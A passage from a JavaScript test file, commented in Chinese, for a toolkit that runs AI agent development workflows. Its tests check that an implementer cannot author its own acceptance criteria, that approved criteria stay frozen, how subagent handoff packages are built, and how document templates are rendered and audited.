  for (const action of ['calibrate', 'preserve', 'ask-human', 'skip', 'snapshot', 'equip']) {
    const res = findUnexecutableArtifacts([{ id: 'no-such-artifact', artifact: 'Z.md', action }])
    if (res.length !== 0) return `action=${action} 不该被查执行者，却报了：${JSON.stringify(res)}`
  }

  // 反向：表里覆盖到的 create 不许误报
  for (const id of Object.keys(ARTIFACT_EXECUTORS)) {
    const res = findUnexecutableArtifacts([{ id, artifact: id, action: 'create' }])
    if (res.length !== 0) return `已有执行者的 ${id} 被误报：${JSON.stringify(res)}`
  }

  // 反向：真实勘察产出的计划必须每一项都有着落（这是这条判据在生产路径上的样子）
  const { survey } = await import('../../scripts/survey.mjs')
  const dir = tmpProject({ 'README.md': '# ap\n\n产物计划测试仓。\n', 'package.json': '{"name":"ap","version":"1.0.0","scripts":{"test":"node --test"}}' })
  try {
    const facts = await survey(dir, {})
    const real = findUnexecutableArtifacts(facts.artifactPlan ?? [])
    if (real.length > 0) return `真实勘察计划里有项没人接：${real.map((x) => x.id).join(',')}`
  } finally { rmTree(dir) }
  return true
}])

// 干活的人不许给自己定验收标准。
//
// 早先这条只写在文档里：SPEC 的 `owner` 与账本的 `implementerId` 是同一个也没人管。
// 于是实现子代理可以直接写一份 SPEC，把验收标准写成「代码能跑就行」，做完再自己宣布通过。
cases.push(['SPEC 作者不得就是实施者', async () => {
  const { checkAuthorIsNotImplementer } = await import('../../kit/skills/lib/doc-requirements.mjs')

  const dir = tmpProject({ 'README.md': '# a\n\n作者检查测试仓。\n', 'src/app.mjs': 'export const v = 1\n' })
  try {
    mkdirSync(join(dir, 'docs', 'specs'), { recursive: true })
    const specWith = (owner) => [
      '---', 'kind: spec', 'title: T', 'status: approved',
      `owner: ${owner === null ? 'null' : `"${owner}"`}`, '---', '', '# SPEC: T', '',
      '## 要解决的问题', '- x', '', '## 本期不做', '- y', '',
      '## 门型与回滚路径', '- two-way', '', '- [ ] C1: z', '',
    ].join('\n')
    const rel = 'docs/specs/261117-a-spec.md'

    // 正向：作者 = 实施者 必须被拦
    writeFileSync(join(dir, rel), specWith('alice'))
    const hit = checkAuthorIsNotImplementer(dir, rel, 'alice')
    if (hit.length !== 1 || hit[0].code !== 'SELF_AUTHORED_ACCEPTANCE') {
      return `作者与实施者同一人未被拦：${JSON.stringify(hit)}`
    }
    // 大小写与 @ 前缀不该让它漏判
    if (checkAuthorIsNotImplementer(dir, rel, '@Alice').length !== 1) return '大小写或 @ 前缀让它漏判了'

    // 反向：不同人放行
    if (checkAuthorIsNotImplementer(dir, rel, 'bob').length !== 0) return '不同人却被拦了'

    // 反向：owner 缺失不判（缺 owner 在 approve 时另有门禁）
    writeFileSync(join(dir, rel), specWith(null))
    if (checkAuthorIsNotImplementer(dir, rel, 'alice').length !== 0) return 'owner 缺失时不该判'

    // 反向：实施者标识缺失不判（缺账本的任务 next 会退回先规划）
    writeFileSync(join(dir, rel), specWith('alice'))
    if (checkAuthorIsNotImplementer(dir, rel, null).length !== 0) return '实施者标识缺失时不该判'
    if (checkAuthorIsNotImplementer(dir, rel, '').length !== 0) return '实施者标识为空串时不该判'

    // 反向：文档不存在不判
    if (checkAuthorIsNotImplementer(dir, 'docs/specs/nope.md', 'alice').length !== 0) return '文档不存在时不该判'
    return true
  } finally { rmTree(dir) }
}])

// 交接包：把「这件事要做什么」从文档里搬出来，别压在主 Agent 的上下文里。
//
// 早先 `flow next` 只给机器事实（分支、SHA、风险档），没有一句「要做什么」。于是主 Agent
// 派子代理时只能自己现编 prompt：去 SPEC 里摘 C 编号、摘影响路径、摘验收命令。这段摘要
// 纯手工，每派一次重写一遍；写到第十次时上下文已被前面的代码与报错撑满。
cases.push(['交接包把该做什么、能改哪里、怎么算做完机械搬出来', async () => {
  const { buildHandoff } = await import('../../kit/skills/lib/handoff-package.mjs')

  const dir = tmpProject({
    'README.md': '# h\n\n交接包测试仓。\n',
    'AGENTS.md': [
      '# h', '', '## Dev Profile', '', '```yaml',
      'quick-test: node scripts/dev/preflight.mjs',
      'full-test: node scripts/dev/fixtures.mjs',
      'merge-gate: npm run all', '```', '',
    ].join('\n'),
  })
  try {
    mkdirSync(join(dir, 'docs', 'specs'), { recursive: true })
    writeFileSync(join(dir, 'docs', 'specs', '261117-h-spec.md'), [
      '---', 'kind: spec', 'title: H', 'status: approved', '---', '',
      '# SPEC: H', '',
      '## 一、背景与边界声明', '',
      '- **本期不做**：不改对外契约；不动 `docs/archive/`', '',
      '## 二、影响范围', '',
      '- 预计涉及文件：`scripts/a.mjs`、`kit/b.mjs`', '',
      '## 三、冻结的验收标准', '',
      '- [ ] C1: 外链存在时以退出码 3 终止',
      '- [ ] C2: 没有外链时退出 0', '',
    ].join('\n'))

    const { prompt, fields } = buildHandoff({
      mainRoot: dir,
      ledger: { taskId: 'h-t', specFile: 'docs/specs/261117-h-spec.md', worktreePath: '.worktrees/impl-h-t', branch: 'feat/h', baseBranch: 'main', baseSha: 'abc1234' },
      policy: { requiredGates: ['full', 'merge-gate'] },
      headSha: 'def5678',
    })

    // 四样该搬的都要搬到
    if (fields.criteriaCount !== 2) return `验收标准没抽全：${fields.criteriaCount}`
    if (!prompt.includes('C1') || !prompt.includes('C2')) return '交接包里没有 C 编号'
    if (!prompt.includes('scripts/a.mjs') || !prompt.includes('kit/b.mjs')) return '交接包里没有影响路径'
    if (!prompt.includes('不改对外契约')) return '交接包里没有「不许顺手做什么」'
    if (!prompt.includes('node scripts/dev/preflight.mjs')) return '交接包里没有验收命令'

    // 反向：抽不到的项要明说「没有登记」，不许编
    const empty = buildHandoff({ mainRoot: dir, ledger: { taskId: 'x', specFile: null, todoFile: null }, policy: null })
    if (!/没有登记验收标准/.test(empty.prompt)) return '没有验收标准时没说「没有登记」，可能在编'
    if (!/没有登记影响路径/.test(empty.prompt)) return '没有影响路径时没说「没有登记」'
    if (!/只准在隔离位改/.test(empty.prompt)) return '交接包没写「只准在隔离位改」这条边界'

    // 反向：没有 SPEC 但 Todo 里有验收标准时，要退到 Todo 取
    mkdirSync(join(dir, 'docs', 'todo'), { recursive: true })
    writeFileSync(join(dir, 'docs', 'todo', '261117-h-todo.md'), [
      '---', 'kind: todo', 'title: H', 'status: active', '---', '',
      '# Todo: H', '', '## 验收标准与执行清单', '', '- [ ] C1: 只有 Todo 也能抽到', '',
    ].join('\n'))
    const fromTodo = buildHandoff({ mainRoot: dir, ledger: { taskId: 'y', todoFile: 'docs/todo/261117-h-todo.md' }, policy: null })
    if (fromTodo.fields.criteriaCount !== 1) return `没有 SPEC 时没退到 Todo：${fromTodo.fields.criteriaCount}`
    if (fromTodo.fields.sourceDoc !== 'docs/todo/261117-h-todo.md') return '来源文档记错了'
    return true
  } finally { rmTree(dir) }
}])

// 规划审核的「这一轮看什么」：上轮意见要留痕，别让 Round 2 重读全文或只看改动。
//
// 代码审查早有增量视野硬锁；规划审核此前没有。于是 Round 2 的复核人要么重读全文
// （吃光上下文），要么只看改动（新问题一条看不到）。根子是没有东西告诉它这一轮的范围。
cases.push(['规划审核范围：上轮意见留痕，改没改都要逐条回看', async () => {
  const { buildCritiqueScope, serializeFindings, parseFindings } = await import('../../kit/skills/lib/critique-rounds.mjs')

  // 序列化往返
  const raw = serializeFindings(1, ['C1 不可判定', { severity: 'should', text: '缺反向条件' }])
  const parsed = parseFindings(raw)
  if (parsed.length !== 2) return `往返丢了条目：${parsed.length}`
  if (parsed[0].severity !== 'must' || parsed[1].severity !== 'should') return `严重度丢了：${JSON.stringify(parsed)}`

  // 正向：上轮意见必须出现在这一轮的范围清单里
  const scope = buildCritiqueScope({ round: 2, currentSha: 'bbbb', previousSha: 'aaaa', findingsRaw: raw, reviewer: 'carol' })
  if (!scope.prompt.includes('C1 不可判定')) return '上轮意见没进这一轮的范围清单'
  if (!scope.prompt.includes('缺反向条件')) return '上轮建议也没进范围清单'
  if (scope.mustRecheck.length !== 2) return `mustRecheck 数量不对：${scope.mustRecheck.length}`
  if (!scope.changed) return '正文改过却没标出来'

  // 反向：正文没改时不许说「改过」，且要提示「被驳回的更成立吗」
  const unchanged = buildCritiqueScope({ round: 2, currentSha: 'aaaa', previousSha: 'aaaa', findingsRaw: raw, reviewer: 'carol' })
  if (unchanged.changed) return '正文没改却说改了'
  if (!/没有改动/.test(unchanged.prompt)) return '没改时没提示'
  if (!/仍然成立/.test(unchanged.prompt)) return '没改时没提示「被驳回的更要回看」'

  // 反向：没有历史意见时不许假装有
  const fresh = buildCritiqueScope({ round: 2, currentSha: 'x', previousSha: null, findingsRaw: '', reviewer: 'carol' })
  if (fresh.mustRecheck.length !== 0) return '没有历史意见却给出 mustRecheck'
  if (!/没有记录意见/.test(fresh.prompt)) return '没有历史意见时没说清'

  // 反向：坏数据不该把整轮堵死
  if (parseFindings('garbage ;; 2|must|还能读').length !== 1) return '坏数据把好数据也丢了'
  return true
}])

// 主工作区直接改文件：这是「绕过隔离位」的早期信号，此前没有任何东西看得见。
//
// 但它是**警告不是拦截**：小改动（Case 1）本来就该在主工作区做，拦死会把正常路径也堵住。
// 真正的硬拦留在 merge。所以它进 warnings 而不进 blockingReasons。
cases.push(['主工作区有改动时给提醒，但不改阶段、不阻塞', async () => {
  const { evaluateNextState } = await import('../../kit/skills/lib/workflow-policy.mjs')

  const baseTask = {
    taskId: 'w1', caseType: 3, role: 'maintainer', status: 'implementing',
    branch: 'feat/w1', baseBranch: 'main', worktreePath: '.worktrees/impl-w1',
    rounds: [], implementerId: 'alice',
  }
  const rt = (mainDirtyCount) => ({
    opInProgress: false, opName: null, headSha: 'abc1234', dirty: 0,
    mainDirtyCount, policy: { riskTier: 'medium', requiredGates: ['full'], independentReviewRequired: true },
    evidenceValidation: { ok: false, code: 'BLOCKED_NOT_VERIFIED', reason: '尚未实证' },
    nonDocChangesAfterFinalize: false,
  })

  // 正向：主工作区脏 + 有隔离位 → 出警告
  const dirty = evaluateNextState({ activeTasks: [baseTask], selectedTask: baseTask, taskRuntime: rt(2) })
  const hit = (dirty.warnings ?? []).find((w) => w.code === 'WARN_WORKING_IN_MAIN_CHECKOUT')
  if (!hit) return `主工作区脏时没有 WARN_WORKING_IN_MAIN_CHECKOUT：${JSON.stringify(dirty.warnings ?? [])}`
  if (!hit.message.includes('2')) return '警告里没说清有几处改动'
  // 反向：它不许进阻塞原因（那是拦截，不是提醒）
  if ((dirty.blockingReasons ?? []).includes('WARN_WORKING_IN_MAIN_CHECKOUT')) return '警告被误放进阻塞原因'

  // 反向：主工作区干净时不许报
  const clean = evaluateNextState({ activeTasks: [baseTask], selectedTask: baseTask, taskRuntime: rt(0) })
  if ((clean.warnings ?? []).some((w) => w.code === 'WARN_WORKING_IN_MAIN_CHECKOUT')) return '主工作区干净时误报'

  // 反向：没有隔离位的任务（分支模式）不该报——它本来就在主工作区干
  const noWt = { ...baseTask, worktreePath: null }
  const branchMode = evaluateNextState({ activeTasks: [noWt], selectedTask: noWt, taskRuntime: rt(5) })
  if ((branchMode.warnings ?? []).some((w) => w.code === 'WARN_WORKING_IN_MAIN_CHECKOUT')) {
    return '分支模式的任务（本来就在主工作区干）被误报'
  }

  // 反向：警告不得改变阶段
  const samePhase = evaluateNextState({ activeTasks: [baseTask], selectedTask: baseTask, taskRuntime: rt(0) }).phase
  if (dirty.phase !== samePhase) return `警告改变了阶段：脏=${dirty.phase} 干净=${samePhase}`
  return true
}])

// 体检报告里的命令长度必须有上限：一条压平的多行 run 块能有几千字节。
//
// 早先 `missing.slice(0, 3).join('、')` 只限条数、不限每条长度，于是一条超长命令
// 会把整份报告撑变形，而看报告的人只会觉得「这工具怎么这么啰嗦」。
cases.push(['体检报告里的命令展示有字节上限', async () => {
  const { COMMAND_DISPLAY_MAX_BYTES, truncateCommandForDisplay } = await import('../../kit/skills/lib/command-lex.mjs')

  // 正向：超长命令被截断，且带总字节数
  const long = `git archive --format=zip -o dist/a.zip ${'x'.repeat(2000)}`
  const out = truncateCommandForDisplay(long, COMMAND_DISPLAY_MAX_BYTES).text
  if (Buffer.byteLength(out, 'utf8') > COMMAND_DISPLAY_MAX_BYTES + 200) {
    return `截断后仍然太长：${Buffer.byteLength(out, 'utf8')} 字节`
  }
  if (!/字节|…|\.\.\./.test(out)) return `截断后没有标出省略或总长度：${out.slice(0, 80)}`

  // 反向：短命令原样返回，不许被加省略号
  const short = 'npm test'
  if (truncateCommandForDisplay(short, COMMAND_DISPLAY_MAX_BYTES).text !== short) return '短命令被误改了'

  // 反向：真实体检路径上也要有上限——造一个命令超长的仓，看 review 的输出长度
  const dir = tmpProject({
    'README.md': '# long\n\n命令长度测试仓。\n',
    'package.json': '{"name":"long","version":"1.0.0","scripts":{"test":"node --test"}}',
    'AGENTS.md': '# long\n\n## Dev Profile\n\n```yaml\nquick-test: exit 0\n```\n',
    'Makefile': 'test:\n\t' + 'echo very-long-command-segment '.repeat(200) + '\n\nfull:\n\techo other\n\nverify:\n\techo third\n\nbuild:\n\techo fourth\n\ninstall:\n\techo fifth\n',
  })
  try {
    const { reviewProject } = await import('../../scripts/review.mjs')
    const res = await reviewProject(dir, { scopes: new Set(['agents']) })
    const stale = (res.results ?? []).find((f) => f.id === 'agents.commands-stale')
    if (!stale) return '夹具没造出 agents.commands-stale —— 这条判据在生产路径上没被测到'
    const len = Buffer.byteLength(String(stale.title), 'utf8')
    if (len > 1200) return `体检结论本身过长（${len} 字节），单条命令没有长度上限`
    return true
  } finally { rmTree(dir) }
}])

// 冷启动全景：新会话不该靠翻目录才知道这个仓做到哪了。
//
// 早先 `flow next` 无任务时只说「请先运行 triage 或 start」。而进度信息一直在仓库里
// （frontmatter 的状态与勾选数），只是没有入口把它们摆出来。
cases.push(['冷启动全景把进度摆出来，且不猜', async () => {
  const { buildSessionOrientation } = await import('../../kit/skills/lib/session-orient.mjs')

  const dir = tmpProject({ 'README.md': '# o\n\n冷启动测试仓。\n' })
  try {
    mkdirSync(join(dir, 'docs', 'prd'), { recursive: true })
    mkdirSync(join(dir, 'docs', 'specs'), { recursive: true })
    mkdirSync(join(dir, 'docs', 'todo'), { recursive: true })

    // 空仓：不许编进度，要明说没有
    const empty = buildSessionOrientation(dir)
    if (empty.docs.prd.length !== 0 || empty.docs.specs.length !== 0) return '空仓却报出了文档'
    if (!/没有卡住的文档/.test(empty.text)) return '空仓时没说「没有卡住的文档」'
    if (empty.nextSteps.length === 0) return '空仓时没给下一步'

    // 有文档：要在全景里出现，且未批准要被判成「卡住」
    writeFileSync(join(dir, 'docs', 'prd', '261117-x-prd.md'), [
      '---', 'kind: prd', 'title: X', 'status: draft', 'issue: 7', '---', '',
      '# PRD: X', '', '## 要解决的问题', '- a', '', '## 本期不做', '- b', '',
      '## 门型与回滚路径', '- two-way', '', '- [ ] C1: c1', '- [ ] C2: c2', '',
    ].join('\n'))
    const filled = buildSessionOrientation(dir)
    if (filled.docs.prd.length !== 1) return `PRD 没被扫到：${filled.docs.prd.length}`
    if (!filled.docs.prd[0].issue) return '全景里没带 Issue 编号'
    if (!filled.stuck.some((s) => s.why.includes('未批准'))) return '未批准的 PRD 没被列进「卡在哪」'
    if (!/0\/2 条已勾|0\/2/.test(filled.text)) return '全景里没报勾选进度'
    if (!/未批准/.test(filled.text)) return '全景里没报阻塞原因'

    // 反向：已批准的 PRD 不该被列成卡住
    writeFileSync(join(dir, 'docs', 'prd', '261117-x-prd.md'), [
      '---', 'kind: prd', 'title: X', 'status: active', 'issue: 7', '---', '',
      '# PRD: X', '', '## 要解决的问题', '- a', '', '## 本期不做', '- b', '',
      '## 门型与回滚路径', '- two-way', '', '- [x] C1: c1', '',
    ].join('\n'))
    const approved = buildSessionOrientation(dir)
    if (approved.stuck.some((s) => s.file.includes('x-prd'))) return '已批准的 PRD 被误判成卡住'

    // 反向：勾选没做完却标 implemented，要报出来
    writeFileSync(join(dir, 'docs', 'specs', '261117-y-spec.md'), [
      '---', 'kind: spec', 'title: Y', 'status: implemented', '---', '',
      '# SPEC: Y', '', '## 要解决的问题', '- a', '', '## 本期不做', '- b', '',
      '## 门型与回滚路径', '- two-way', '', '- [x] C1: done', '- [ ] C2: not done', '',
    ].join('\n'))
    const inconsistent = buildSessionOrientation(dir)
    if (!inconsistent.stuck.some((s) => s.why.includes('勾选未完成'))) {
      return '标了 implemented 但勾选没做完，没被报出来'
    }
    return true
  } finally { rmTree(dir) }
}])

// 文档模板只有一个真相源：改模板就该改产物，删章节要按项目声明来。
//
// 早先 `templates/docs-prd.md` 和生成器里的字符串数组是两份互不相干的内容：
// 模板文件被 preflight 校验、被人当参考改，但真实生成的文档一个字都不用它。
// 于是「我改了模板」和「产物变了」之间没有任何关系。
cases.push(['模板文件就是产物来源，可选章节按项目声明增删', async () => {
  const { renderDocTemplate, readDocTemplate, templateSections } = await import('../../kit/skills/lib/doc-template-render.mjs')
  const { resolveDocRequirements } = await import('../../kit/skills/lib/doc-requirements.mjs')

  // 正向：三份模板都能读出来，且都声明了主干节
  for (const kind of ['prd', 'spec', 'todo']) {
    const raw = readDocTemplate(kind)
    if (!raw) return `读不到 ${kind} 模板`
    const ids = templateSections(raw).map((s) => s.id)
    for (const must of ['goal', 'acceptance']) {
      if (!ids.includes(must)) return `${kind} 模板缺少主干章节 ${must}`
    }
  }

  // 正向：渲染会真的把占位填掉，且不残留章节标记
  const rendered = renderDocTemplate('prd', {
    vars: {
      TITLE: '标题甲', TODAY: '2026-01-01', ISSUE: 'null', ISSUE_LABEL: '未关联',
      OWNER: '甲', OWNER_LABEL: '甲', NON_GOALS: '- 不做乙', REUSABLE: '- 复用丙',
      CRITERIA: '- [ ] C1: 命令退出码为 0', DOOR: 'two-way', ROLLBACK: '反向提交',
      QUICK_CMD: 'node --test',
    },
  })
  if (!rendered.includes('标题甲') || !rendered.includes('不做乙')) return '占位没有被填进产物'
  if (/\{\{[A-Z0-9_]+\}\}/.test(rendered)) return `产物里残留未填占位：${/\{\{[A-Z0-9_]+\}\}/.exec(rendered)[0]}`
  if (/<!--\s*\/?section:/.test(rendered)) return '产物里残留章节标记'

  // 反向：没给值时写「待补齐」，不许留空
  const sparse = renderDocTemplate('prd', { vars: { TITLE: '标题乙', TODAY: '2026-01-01' } })
  if (!sparse.includes('待补齐')) return '缺值时没有写「待补齐」，而是留了空'

  // 正向：项目声明 omit 的章节会被裁掉
  const dir = tmpProject({
    'README.md': '# o\n\n模板裁剪测试仓。\n',
    'docs/templates/prd.md': ['---', 'kind: prd', 'omit_sections: [reuse, flow, pending]', '---', '', '# 项目自己的 PRD 模板', '', '## 额外章节', '', '内容', ''].join('\n'),
  })
  try {
    const req = resolveDocRequirements(dir, 'prd')
    if (!req.omit.has('reuse')) return 'omit 声明没被读出来'
    const pruned = renderDocTemplate('prd', { vars: { TITLE: '丙', TODAY: '2026-01-01' }, dropSections: req.omit })
    if (pruned.includes('复用既有模块')) return '声明要删的章节还在'
    if (!pruned.includes('要解决的问题')) return '主干章节被误删了'

    // 反向：主干三节写进 omit 也不许删
    const guarded = tmpProject({
      'README.md': '# o\n\n主干保护测试仓。\n',
      'docs/templates/prd.md': ['---', 'kind: prd', 'omit_sections: [goal, acceptance]', '---', '', '# 模板', ''].join('\n'),
    })
    try {
      const req2 = resolveDocRequirements(guarded, 'prd')
      if (req2.omit.has('goal') || req2.omit.has('acceptance')) return '主干章节被允许列进 omit——那等于允许不写要做什么'
    } finally { rmTree(guarded) }
    return true
  } finally { rmTree(dir) }
}])

// 文档模板要能适配完全不同的项目，而不是一套七节表走天下。
//
// 早先的模板是固定七节，且生成器里另有一份写死的内容：改模板文件对产物毫无影响。
// 更实际的问题是——CLI 工具没有「数据模型」，数据管道没有「关键交互」，
// 论文仓没有「复用模块」。写死章节逼着人填「不适用」，或者干脆绕过流程。
cases.push(['文档模板按项目形态裁剪，且填不上的可选节不留占位', async () => {
  const { renderDocTemplate, templateSections, DOC_TEMPLATE_VARS } = await import('../../kit/skills/lib/doc-template-render.mjs')

  // 正向 1：三份模板都有主干三节。注意渲染后标记已被清除，
  // 所以要查**模板原文**而不是产物——产物里章节只剩标题。
  const fsMod = await import('node:fs')
  for (const kind of ['prd', 'spec', 'todo']) {
    const raw = fsMod.readFileSync(new URL(`../../kit/skills/templates/docs-${kind}.md`, import.meta.url), 'utf8')
    const ids = templateSections(raw).map((s) => s.id)
    for (const must of ['goal', 'acceptance']) {
      if (!ids.includes(must)) return `${kind} 模板没有主干章 ${must}`
    }
  }

  // 正向 2：真实项目形态能落地——PRD 的十节里，身份/流程/规则/非功能都是可选
  const prdSections = templateSections(await import('node:fs').then((fs) => fs.readFileSync(
    new URL('../../kit/skills/templates/docs-prd.md', import.meta.url), 'utf8')))
  const optionalIds = prdSections.filter((s) => s.optional).map((s) => s.id)
  for (const must of ['users', 'flow', 'rules', 'nfr']) {
    if (!optionalIds.includes(must)) return `PRD 模板的 ${must} 节不是可选的——纯工具类项目会被迫填「不适用」`
  }

  // 正向 3：不填 optional 时，那一节必须整节消失（否则会带着尖括号占位过不了审计）。
  // 主干**故意留着**占位让人看见该写什么，所以这里只查可选节对应的标题还在不在。
  const sparse = renderDocTemplate('prd', { vars: { TITLE: 'T', TODAY: '2026-01-01' } })
  for (const [id, title] of [['users', '用户身份与权限'], ['rules', '状态与业务规则'], ['nfr', '非功能要求'], ['reuse', '复用既有模块']]) {
    if (sparse.includes(title)) return `未填的可选节「${title}」没有被剪掉——它会带着尖括号占位过不了审计`
  }

  // 正向 4：**给了值就要保留**——否则等于把可选节全删了，模板再全也没用
  const rich = renderDocTemplate('prd', {
    vars: {
      TITLE: 'T', TODAY: '2026-01-01', NON_GOALS: '- 不做 X', REUSABLE: '- 复用 profile.mjs',
      CRITERIA: '- [ ] C1: x', DOOR: 'two-way', ROLLBACK: '反向提交',
    },
  })
  if (!rich.includes('复用既有模块')) return '给了复用模块却把这一节剪掉了'
  if (!rich.includes('门型与回滚')) return '给了门型却把这一节剪掉了'

  // 反向 1：主干填不上要留占位让人看见，不许静默删掉
  if (!/<[\u4e00-\u9fa5][^<>\n]{1,120}>/.test(sparse)) return '主干填不上时也没留占位——人不会知道这里要写东西'
  if (!sparse.includes('要解决的问题')) return '主干「要解决的问题」被误删了'

  // 反向 2：项目声明不要的章节要被裁掉
  const dropped = renderDocTemplate('prd', {
    vars: { TITLE: 'T', TODAY: '2026-01-01', NON_GOALS: '- 不做', REUSABLE: '- 复用', CRITERIA: '- [ ] C1: x', DOOR: 'two-way', ROLLBACK: 'r' },
    dropSections: new Set(['users', 'rules']),
  })
  if (dropped.includes('用户身份与权限')) return '声明要删的章节还在'
  if (!dropped.includes('要解决的问题')) return '主干被误删'

  // 占位登记表不能漂：模板里出现的每个占位都得能取值
  for (const kind of ['prd', 'spec', 'todo']) {
    const raw = await import('node:fs').then((fs) => fs.readFileSync(
      new URL(`../../kit/skills/templates/docs-${kind}.md`, import.meta.url), 'utf8'))
    const names = [...new Set([...raw.matchAll(/\{\{([A-Z0-9_]+)\}\}/g)].map((m) => m[1]))]
    const unreg = names.filter((n) => !DOC_TEMPLATE_VARS[kind].includes(n))
    if (unreg.length > 0) return `${kind} 模板有未登记占位：${unreg.join(',')}`
  }
  return true
}])

// 验收标准「冻结」必须是真的冻住，不是文档里的一句话。
//
// 早先 approve 之后回到 SPEC 里把 C3 从「必须拒绝并退出码 1」改成「允许通过」，
// 文件照样合法、audit 照样通过、finalize 照样放行；只有审查者凭记忆才能发现。
// 人的记忆不是门禁。
cases.push(['验收标准批准即冻结，改过要能被逐条指出来', async () => {
  const { extractCriteria, criteriaFingerprint, compareCriteria, describeCriteriaDrift } =
    await import('../../kit/skills/lib/criteria-lock.mjs')

  // 正向：抽出编号与正文
  const base = extractCriteria([
    '## 验收标准', '',
    '- [ ] C1: 退出码为 0',
    '- [ ] C2: 异常输入必须拒绝',
    '- [x] C3: 输出含预期字段',
    '', '```sh', '- [ ] C9: 代码块里的不算', '```', '',
  ].join('\n'))
  if (base.length !== 3) return `应抽出 3 条，实际 ${base.length}：${base.map((c) => c.id).join(',')}`
  if (!base.find((c) => c.id === 'C3')?.checked) return '勾选状态没读对'

  // 反向：勾选变化**不算**标准变化——那是实现进度，算进去会让门禁变成噪音
  const checked = extractCriteria('- [x] C1: 退出码为 0\n- [x] C2: 异常输入必须拒绝\n- [x] C3: 输出含预期字段')
  if (criteriaFingerprint(base) !== criteriaFingerprint(checked)) {
    return '只是打了勾就判成标准变了——这种噪音会让人直接把门禁关掉'
  }

  // 正向：正文改松要被抓到，并点名到 C 编号
  const relaxed = extractCriteria('- [ ] C1: 退出码为 0\n- [ ] C2: 异常输入允许通过\n- [ ] C3: 输出含预期字段')
  const drift = compareCriteria(base, relaxed)
  if (drift.same) return '把「必须拒绝」改成「允许通过」竟然没被发现'
  if (drift.changed.join(',') !== 'C2') return `改动的条目报错了：${drift.changed.join(',')}`
  if (!describeCriteriaDrift(drift).includes('C2')) return '说明里没点到 C2'

  // 正向：删掉一条、新增一条都要看得见
  const removed = compareCriteria(base, extractCriteria('- [ ] C1: 退出码为 0\n- [ ] C3: 输出含预期字段'))
  if (removed.removed.join(',') !== 'C2') return `删条目没报对：${removed.removed.join(',')}`
  const added = compareCriteria(base, extractCriteria('- [ ] C1: 退出码为 0\n- [ ] C2: 异常输入必须拒绝\n- [ ] C3: 输出含预期字段\n- [ ] C4: 新要求'))
  if (added.added.join(',') !== 'C4') return `新增条目没报对：${added.added.join(',')}`

  // 反向：顺序调换不算变化（排序后再比）
  const reordered = extractCriteria('- [ ] C3: 输出含预期字段\n- [ ] C1: 退出码为 0\n- [ ] C2: 异常输入必须拒绝')
  if (!compareCriteria(base, reordered).same) return '只是调了顺序就判成改标准了'

  return true
}])

// 认节要看内容，不能只看标题像不像模板。
//
// 同一个「不做什么」，有人写 `## 明确不做（Non-Goals）`，有人写 `## 不在本次范围`，
// 有人写 `## Out of scope`，还有人写在目标那节的最后一句里。全都写了，
// 按标题认会判成「没写」——那是最气人的一种误报：人明明写了，工具说没有。
cases.push(['认节看内容不看标题：换个写法也算写了', async () => {
  const { resolveDocRequirements, resolveSectionPresence, findMissingSections } =
    await import('../../kit/skills/lib/doc-requirements.mjs')

  const req = resolveDocRequirements(null, 'spec')
  if (req.sections.some((s) => s.id === 'door')) return '默认竟然还要求「门型与回滚」——没门的项目只能编一个'

  // 正向 1：中文标题但换了说法
  const zh = [
    '## 背景与动机', '',
    '现有流程每天凌晨跑批，上游变更后静默丢字段，需要改成强校验。', '',
    '## 不在本次范围', '', '- 不改调度器', '',
    '## 交付判据', '', '- [ ] C1: 退出码为 1', '',
  ].join('\n')
  const f1 = resolveSectionPresence(zh, req)
  const m1 = findMissingSections(req, f1, { hasInlineAcceptance: true })
  if (m1.length > 0) return `中文变体被判缺节：${m1.map((m) => m.id).join(',')}`

  // 正向 2：英文标题 + 隐式写法（非目标藏在目标那节里）
  const en = [
    '## Why', '',
    'The ETL job silently drops columns. We need to fail fast.', '',
    '## Approach', '',
    "Validate on read. We won't touch the scheduler this round.", '',
    '## Done when', '', '- [ ] C1: node x.mjs exits 1', '',
  ].join('\n')
  const f2 = resolveSectionPresence(en, req)
  const m2 = findMissingSections(req, f2, { hasInlineAcceptance: true })
  if (m2.length > 0) {
    return `英文/隐式写法被判缺节：${m2.map((m) => m.id + '/' + m.reason).join(',')}`
  }

  // 反向 1：真没写「不做什么」就要报出来——否则这条判据等于被删掉
  const noNonGoals = [
    '## 背景', '', '现有流程有问题，需要改。', '',
    '## 验收', '', '- [ ] C1: 退出码 0', '',
  ].join('\n')
  const f3 = resolveSectionPresence(noNonGoals, req)
  if (!findMissingSections(req, f3, { hasInlineAcceptance: true }).some((m) => m.id === 'non-goals')) {
    return '完全没写非目标，却也没报缺——那这条判据等于不存在'
  }

  // 反向 2：空壳章节不算写了（有标题没内容）
  const empty = '## 要解决的问题\n\n## 本期不做\n\n## 验收标准\n\n- [ ] C1: x\n'
  const f4 = resolveSectionPresence(empty, req)
  if (!findMissingSections(req, f4, { hasInlineAcceptance: true }).some((m) => m.id === 'goal')) {
    return '只有标题没内容的「要做什么」被判成写了'
  }

  return true
}])

// TDD 的主干判定同样要看内容：真实项目的标题千奇百怪。
//
// `## 2. 系统架构全景（双平面、四层正交）`、`## Architecture`、`## 部署架构` 里顺手写模块边界，
// 逐字比对标题会把一份写得比模板更细的文档判成缺节。
cases.push(['TDD 主干按内容认，空壳仍要报', async () => {
  const { checkTddStructure } = await import('../../kit/skills/lib/tdd-structure.mjs')

  // 正向 1：英文标题 + 异名标题，内容答全了
  const alt = [
    '# MyApp TDD', '',
    '## Version', '', '- 文档版本 0.1.0', '- 基线：当前源码与清单', '- 明确不做：不做多租户', '',
    '## Architecture', '',
    '| 模块 | 职责 | 依赖方向 |', '| --- | --- | --- |', '| core | 核心 | 仅基础层 |', '',
    '## Data flow', '', '主链路是 读入 -> 校验 -> 落盘。', '',
    '## Invariants', '', '- 单一真相源：配置只在 protocol.mjs', '',
  ].join('\n')
  const errs = checkTddStructure(alt)
  if (errs.length > 0) return `异名标题被判缺节：${errs.map((e) => e.code).join(',')}`

  // 正向 2：中文带编号的标题
  const numbered = [
    '# x TDD', '',
    '## 文档信息', '', '| 文档版本 | 1.0 |', '| --- | --- |', '',
    '## 1. 背景与非目标', '', '- 核心定位：给运维用', '- 非目标：不做多租户', '',
    '## 2. 系统架构全景（双平面）', '', '模块与目录职责见下表。', '| 模块 | 职责 |', '| --- | --- |', '| a | b |', '',
    '## 3. 主链路', '', '正常主链路：读入 -> 落盘。', '',
    '## 4. 不变量', '', '- 单一真相源', '',
  ].join('\n')
  const errs2 = checkTddStructure(numbered)
  if (errs2.length > 0) return `带编号中文标题被判缺节：${errs2.map((e) => e.code).join(',')}`

  // 反向 1：空壳必须报全——否则这条判据等于被删掉
